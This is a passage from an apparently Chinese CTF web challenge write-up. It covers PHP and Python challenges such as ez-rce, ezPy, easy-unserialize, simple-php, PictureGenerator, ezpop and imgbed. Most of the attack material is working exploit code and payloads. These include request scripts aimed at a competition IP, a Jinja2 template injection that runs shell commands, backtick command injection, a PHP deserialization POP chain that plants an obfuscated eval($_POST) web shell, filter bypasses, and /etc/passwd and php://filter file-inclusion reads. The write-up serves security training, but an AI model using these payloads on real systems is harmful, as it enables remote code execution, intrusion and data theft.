class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$func</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$a</span>); <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span>[<span class="variable">$j</span>] == <span class="variable">$func</span>[<span class="variable">$i</span>]) &#123;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>[<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fuzz结果如下,可以看到<code>time</code>相关的函数没有被过滤,<code>localtime()</code>返回一个数组,秒在第一位,可以通过读取秒数转化为字符来构造<code>.</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">string &#x27;time&#x27; (length=4)</span><br><span class="line">string &#x27;localtime&#x27; (length=9)</span><br><span class="line">string &#x27;readgzfile&#x27; (length=10)</span><br><span class="line">string &#x27;session_id&#x27; (length=10)</span><br><span class="line">string &#x27;phpversion&#x27; (length=10)</span><br><span class="line">string &#x27;hebrevc&#x27; (length=7)</span><br><span class="line">string &#x27;str_split&#x27; (length=9)</span><br><span class="line">string &#x27;localeconv&#x27; (length=10)</span><br><span class="line">string &#x27;chr&#x27; (length=3)</span><br><span class="line">string &#x27;ord&#x27; (length=3)</span><br><span class="line">string &#x27;system&#x27; (length=6)</span><br><span class="line">string &#x27;ceil&#x27; (length=4)</span><br><span class="line">string &#x27;floor&#x27; (length=5)</span><br><span class="line">string &#x27;sin&#x27; (length=3)</span><br><span class="line">string &#x27;cos&#x27; (length=3)</span><br><span class="line">string &#x27;tan&#x27; (length=3)</span><br><span class="line">string &#x27;sinh&#x27; (length=4)</span><br><span class="line">string &#x27;cosh&#x27; (length=4)</span><br><span class="line">string &#x27;tanh&#x27; (length=4)</span><br><span class="line">string &#x27;sqrt&#x27; (length=4)</span><br><span class="line">string &#x27;serialize&#x27; (length=9)</span><br><span class="line">string &#x27;highlight_file&#x27; (length=14)</span><br><span class="line">string &#x27;show_source&#x27; (length=11)</span><br><span class="line">string &#x27;strval&#x27; (length=6)</span><br><span class="line">string &#x27;readfile&#x27; (length=8)</span><br><span class="line">string &#x27;fclose&#x27; (length=6)</span><br><span class="line">string &#x27;tmpfile&#x27; (length=7)</span><br><span class="line">string &#x27;file&#x27; (length=4)</span><br><span class="line">string &#x27;crypt&#x27; (length=5)</span><br><span class="line">string &#x27;chdir&#x27; (length=5)</span><br><span class="line">string &#x27;scandir&#x27; (length=7)</span><br><span class="line">string &#x27;end&#x27; (length=3)</span><br><span class="line">string &#x27;next&#x27; (length=4)</span><br><span class="line">string &#x27;array_flip&#x27; (length=10)</span><br><span class="line">string &#x27;pos&#x27; (length=3)</span><br></pre></td></tr></table></figure>

<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://35.229.138.83:12807/&quot;</span></span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:7890&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scandir</span>():</span><br><span class="line">    data = &#123;<span class="string">&#x27;shell&#x27;</span>: <span class="string">&#x27;var_dump(scandir(chr(pos(localtime(time())))));&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(url=url, headers=headers, data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">    data = &#123;<span class="string">&#x27;shell&#x27;</span>: <span class="string">&#x27;show_source(end(scandir(chr(pos(localtime(time()))))));&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(url=url, headers=headers, data=data, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> time.strftime(<span class="string">&quot;%S&quot;</span>, time.localtime()) == <span class="built_in">str</span>(<span class="built_in">ord</span>(<span class="string">&#x27;.&#x27;</span>)):</span><br><span class="line">            <span class="comment"># scandir()</span></span><br><span class="line">            getflag()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/xp0int-2021-ctf-web-wp/ez-rce.png"></p>
<p>除了使用<code>time()</code>外,还可以使用<code>crypt()</code></p>
<p><code>var_dump(scandir(chr(ord(hebrevc(crypt(time()))))));</code></p>
<p><code>shell=var_dump(scandir(chr(ord(strrev(crypt(serialize(array())))))));</code></p>
<h2 id="ezPy"><a href="#ezPy" class="headerlink" title="ezPy"></a>ezPy</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">ssti模板注入</a></p>
<p>传入<code>name=&#123;&#123;2+2&#125;&#125;</code>,报错,返回<code>jinja2</code></p>
<p>传入<code>name=&#123;&#123;2-2&#125;&#125;</code>,返回<code>0</code>,说明存在模板注入</p>
<p>传入<code>name=&#123;&#123;%27%27.__class__.__mro__[1].__subclasses__()&#125;&#125;</code>列出子类的集合</p>
<p><code>&lt;class &#39;os._wrap_close&#39;&gt;</code>适合被利用,其位置为118</p>
<p>传入<code>?name=&#123;&#123;%27%27.__class__.__mro__[1].__subclasses__()[118].__init__.__globals__[%27__builtins__%27][%27eval%27]("__import__(%27os%27).popen(%27whoami%27).read()")&#125;&#125;</code>返回<code>root</code></p>
<p>传入<code>?name=&#123;&#123;%27%27.__class__.__mro__[1].__subclasses__()[118].__init__.__globals__[%27__builtins__%27][%27eval%27]("__import__(%27os%27).popen(%27cat%20/flag%27).read()")&#125;&#125;</code>即可getflag</p>
<h2 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/shenjuxian/p/14097169.html">thinkphp 5.0.23 rce</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/xp0int-2021-ctf-web-wp/thinkphp.png"></p>
<h2 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy-unserialize"></a>easy-unserialize</h2><p>反序列化字符串逃逸</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;asdf&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>O:4:&quot;Demo&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;asdf&quot;;&#125;</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;asdf&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;O:4:&quot;Demo&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;asdf&quot;;&#125;123456&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">object(Demo)#1 (1) &#123;</span><br><span class="line">  [&quot;a&quot;]=&gt;</span><br><span class="line">  string(4) &quot;asdf&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化的过程是<code>&#123;</code>最近的<code>;&#125;</code>完成匹配并停止解析,在序列化结果的结尾加上无意义字符串仍然能够进行反序列化</p>
<p>exp如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getflag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file === <span class="string">&quot;flag.php&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tmp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str1</span>, <span class="variable">$str2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str1 = <span class="variable">$str1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str2 = <span class="variable">$str2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&#x27;easyeasyeasyeasyeasyeasyeasyeasyeasy&#x27;</span>;</span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&#x27;;s:4:&quot;str2&quot;;O:7:&quot;getflag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">tmp</span>(<span class="variable">$str1</span>, <span class="variable">$str2</span>));</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;easy&quot;</span>, <span class="string">&quot;ez&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>

<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple-php"></a>simple-php</h2><p>题目提示<code>代码写着写着就黑屏</code></p>
<p>猜测使用vim并存在swp文件</p>
<p>访问<code>index.php.swp</code>即可下载</p>
<p>可以使用<code>vim -r index.php.swp</code>进行恢复,也可以直接打开查看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;./flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">14</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;too long !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9_&amp;^&lt;&gt;&quot;\&#x27;$#@!*&amp;+=.`\[\]&#123;&#125;?,]+/&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot; No ! No !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤规则中没有对<code>~</code>进行过滤,同时环境为php7,因此将shell取反即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:7890&quot;</span>&#125;<span class="comment">#因为服务器在台湾,所以使用代理</span></span><br><span class="line">function=<span class="string">&quot;getflag&quot;</span></span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> function:</span><br><span class="line">    payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">hex</span>(<span class="number">255</span>-<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">payload=<span class="string">&quot;(~&quot;</span>+payload+<span class="string">&quot;)();&quot;</span></span><br><span class="line"></span><br><span class="line">r=requests.get(url=<span class="string">&quot;http://35.229.138.83:15320/?code=&quot;</span>+payload,proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/xp0int-2021-ctf-web-wp/simple-php-1.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/xp0int-2021-ctf-web-wp/simple-php-2.png"></p>
<h2 id="PictureGenerator"><a href="#PictureGenerator" class="headerlink" title="PictureGenerator"></a>PictureGenerator</h2><p>关键代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = request.form.getlist(<span class="string">&#x27;text&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">data = data.replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">data = data.replace(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">name = <span class="string">&quot;&quot;</span>.join(random.choices(chars,k=<span class="number">8</span>)) + <span class="string">&quot;.png&quot;</span></span><br><span class="line">os.system(<span class="string">f&quot;python3 gene.py <span class="subst">&#123;name&#125;</span> \&quot;<span class="subst">&#123;data&#125;</span>\&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>由于<code>$</code>被过滤,所以传入``去构造命令执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="built_in">print</span>(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python3 test.py &quot;`whoami`&quot;</span><br><span class="line">misaka</span><br><span class="line">python3 test.py &quot;`pwd`&quot;</span><br><span class="line">/home/misaka/AttackCode</span><br><span class="line">python3 test.py &quot;$(whoami)&quot;</span><br><span class="line">misaka</span><br><span class="line">python3 test.py &quot;$(pwd)&quot;</span><br><span class="line">/home/misaka/AttackCode</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:7890&quot;</span>&#125;<span class="comment">#因为服务器在台湾,所以使用代理</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;cat /flag&quot;</span></span><br><span class="line">data=&#123;<span class="string">&quot;text&quot;</span>:<span class="string">&quot;`%s &gt; static/images/misaka.txt`&quot;</span>%payload,<span class="string">&quot;submit&quot;</span>:<span class="string">&quot;:generate:&quot;</span>&#125;</span><br><span class="line">requests.post(url=<span class="string">&quot;http://35.229.138.83:12909/generate&quot;</span>,data=data,proxies=proxies)</span><br><span class="line">r=requests.get(url=<span class="string">&quot;http://35.229.138.83:12909/static/images/misaka.txt&quot;</span>,proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>考点:</p>
<ol>
<li><p>__wakeup 绕过</p>
</li>
<li><p>date()函数对格式字符串进行转义</p>
</li>
<li><p>create_function</p>
</li>
</ol>
<p>绕过__wakeup使得<code>openfunc-&gt;object</code>指向<code>evil</code></p>
<p><code>evil-&gt;b</code>指向<code>normal</code>,<code>evil-&gt;c=&quot;\\s\h\\e\l\l&quot;</code>使得执行date函数后等于<code>shell</code></p>
<p>绕过黑名单</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump|php/i&#x27;</span>,<span class="variable">$this</span>-&gt;data)</span><br></pre></td></tr></table></figure>

<p>使用<code>&lt;?=</code>代替<code>&lt;?php</code></p>
<ol>
<li>使用<code>create_function</code>创建函数</li>
</ol>
<p>exp如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">openfunc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">hack</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">pass</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pass</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> <span class="keyword">extends</span> <span class="title">hack</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pass</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">date</span>(<span class="string">&quot;\\s\h\\e\l\l&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">openfunc</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">normal</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>-&gt;b = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;c = <span class="string">&quot;\\s\h\\e\l\l&quot;</span>;</span><br><span class="line"><span class="variable">$shell</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;@eval($_POST[a]);&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;data = <span class="string">&quot;&lt;?=\n\$func=&#x27;c&#x27;.&#x27;r&#x27;.&#x27;e&#x27;.&#x27;a&#x27;.&#x27;t&#x27;.&#x27;e&#x27;.&#x27;_&#x27;.&#x27;f&#x27;.&#x27;u&#x27;.&#x27;n&#x27;.&#x27;c&#x27;.&#x27;t&#x27;.&#x27;i&#x27;.&#x27;o&#x27;.&#x27;n&#x27;;\$test=\$func(&#x27;\$x&#x27;,&#x27;e&#x27;.&#x27;v&#x27;.&#x27;a&#x27;.&#x27;l&#x27;.&#x27;(b&#x27;.&#x27;a&#x27;.&#x27;s&#x27;.&#x27;e&#x27;.&#x27;6&#x27;.&#x27;4&#x27;.&#x27;_&#x27;.&#x27;d&#x27;.&#x27;e&#x27;.&#x27;c&#x27;.&#x27;o&#x27;.&#x27;d&#x27;.&#x27;e(\$x));&#x27;);\$test(&#x27;<span class="subst">$shell</span>&#x27;);\n?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="keyword">object</span> = <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;O:8:&quot;openfunc&quot;:1:&#x27;</span>, <span class="string">&#x27;O:8:&quot;openfunc&quot;:2:&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$str</span>));</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>使用<code>&lt;?= $_POST[0]($_POST[1]);?&gt;</code></li>
</ol>
<p>POST传入<code>0=system&amp;1=ls /</code></p>
<ol start="3">
<li>使用<code>&lt;?= passthru(urldecode(xxx))?&gt;</code></li>
</ol>
<h2 id="imgbed"><a href="#imgbed" class="headerlink" title="imgbed"></a>imgbed</h2><p>注册登录后发现<code>index.php?action=class.php</code>,可能存在文件包含</p>
<p>传入<code>index.php?action=/etc/passwd</code>,成功读取,但无法直接读取<code>/flag</code></p>
<p>使用php协议来读取源代码<code>index.php?action=php://filter/read=convert.base64-encode/resource=index.php</code></p>
